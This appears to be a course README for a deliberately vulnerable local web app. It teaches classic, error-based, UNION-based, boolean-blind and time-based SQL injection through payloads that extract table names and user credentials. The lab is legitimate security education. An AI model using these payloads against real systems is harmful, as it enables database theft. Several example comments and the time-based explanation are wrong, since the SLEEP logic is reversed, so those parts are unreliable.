# sqli-demo
SQL Injection proof of concept for C4239. This repository contains an intentionally vulnerable web application, that contains NUS Course data. However, due to **poorly written code**, we are able to enumerate this database as well as obtain sensitive user data.

In this document, we'll walkthrough various SQL Injection (**SQLi**) techniques, how they work and when to use them. We also explain why they can happen and some **mitigation/prevention techniques**.

# Setup
Ensure that you have docker installed. To start the vulnerable application, run the following command:

```
docker-compose up --build -d
```

The vulnerable web application will be available at `http://localhost:3000`

# Classic/In-Band SQLi
Under `http://localhost:3000/classic`, we are able to see an input that allows us to search for a course. For example we can enter:
```sql
CS4239
-- SELECT * FROM courses WHERE course_code = 'CS4239';
```
Which only gets us the result of a single row.

What if we want to enumerate the entire table? Since this application is vulnerable to SQL injection, we are able to run this:
```sql
' OR '1'='1
-- SELECT * FROM courses WHERE course_code = '' OR '1'='1';
```

## Error-Based SQLi

Error messages can provide us with information about the database being attacked. Sending in a single quote generates an error message that tells us that we are on a MySQL database


```sql
'
-- SELECT * FROM courses WHERE course_code = ''';
```

## Union-Based SQLi
Know that we understand how this query is vulnerable, we can do Union-Based SQLi to get more information from the database, not limited to the table.

Now we can deduce the number of columns being returned by trial and error until we get the following:
```sql
' UNION SELECT 1,2,3,4 -- -';
-- SELECT * FROM courses WHERE course_code = '' UNION SELECT 1,2,3,4 -- -';
```
(We do this because to have a union query, both sides of the union must return the same number of columns)

Following that, we can gain access to various information about the database.

```sql
' UNION SELECT user(),database(),version(),4 -- -'
-- SELECT * FROM courses WHERE course_code = '' UNION SELECT user(),database(),version(),4 -- -';
```

Table data:

```sql
' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqlidemo') -- -'
-- SELECT * FROM courses WHERE course_code = '' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqlidemo') -- -';
```

Column data:

```sql
' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users') -- -'
-- SELECT * FROM courses WHERE course_code = '' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(column_name) from information_schema.columns WHERE table_name='users') -- -';
```

Row data:

```sql
' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(username, " ", password) FROM users) -- -'
-- SELECT * FROM courses WHERE course_code = '' UNION SELECT 1,2,3,(SELECT GROUP_CONCAT(username, " ", password) FROM users) -- -'
;
```

# Blind SQLi
What if the application is slightly more secure and displays less information? How can we tell if SQL Injection is still possible? 
## Content-Based/Boolean SQLi
In Content-Based SQLi, we get an oracle that tells us only if our search query is successful or not. 

We can similarly tell if this input is vulnable to SQL Injection by testing some queries:

```sql
' OR 1=1 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR 1=1 -- -';
' OR 1=2 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR 1=2 -- -';
```
If the first query gives a true result and the second gives a false result, we know that this input is vulnerable to such attacks.

We can go on to further to enumerate the database by trial and error:

```sql
' OR (SELECT database() LIKE 'a%') -- -'
-- SELECT * FROM courses WHERE course_code = '' OR 1=1 -- -';
' OR LENGTH(database())=6 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR 1=2 -- -';
' OR SUBSTRING(database(), 1, 1) = 'a' -- -'
-- SELECT * FROM courses WHERE course_code = '' OR 1=2 -- -';
```

Enumerating database tables:

```sql
' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='sqlidemo' LIMIT 1 OFFSET 0) = 5 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='sqlidemo' LIMIT 1 OFFSET 0) = 5 -- -';
' OR (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='your_database' LIMIT 1 OFFSET 0) = 'a' -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='your_database' LIMIT 1 OFFSET 0) = 'a' -- -';
```

Enumerating database tables:

```sql
' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) = 5 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) = 5 -- -';
' OR (SELECT SUBSTRING(column_name, 1, 1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) = 'a' -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT SUBSTRING(column_name, 1, 1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) = 'a' -- -';
```

Enumerating database rows:

```sql
' OR (SELECT LENGTH(username) FROM users LIMIT 1 OFFSET 0) = 5 -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT LENGTH(username) FROM users LIMIT 1 OFFSET 0) = 5 -- -';
' OR (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1 OFFSET 0) = 'a' -- -'
-- SELECT * FROM courses WHERE course_code = '' OR (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1 OFFSET 0) = 'a' -- -';
```

While it takes longer than Classic SQLi, its equally effective when run automatically with a script.

## Time-Based SQLi
In Time-Based SQL Injection, we may not have a boolean indicator to tell us whether something a query returns true or not. However, use things like total query time as an indicator of true or false.

We can use a SLEEP function in MySQL to test whether our query is true. If our query is true, it will return immediately. If the query is false, there will be a delay becuase the SLEEP function will run.

```sql
CS4239' AND SLEEP(5) -- -'
-- SELECT * FROM courses WHERE course_code = 'CS4239' AND SLEEP(5) -- -';
```

Note that we don't use `' OR SLEEP(5) -- -'`, because for every row that doesn't meet the first condition, we also run a SLEEP. So if there is 500 rows that don't meet that condition, it will take 2500 seconds to complete the query, and will be noticed.

We can use this method to enumerate the entire database, similar to the Content-Based SQLi.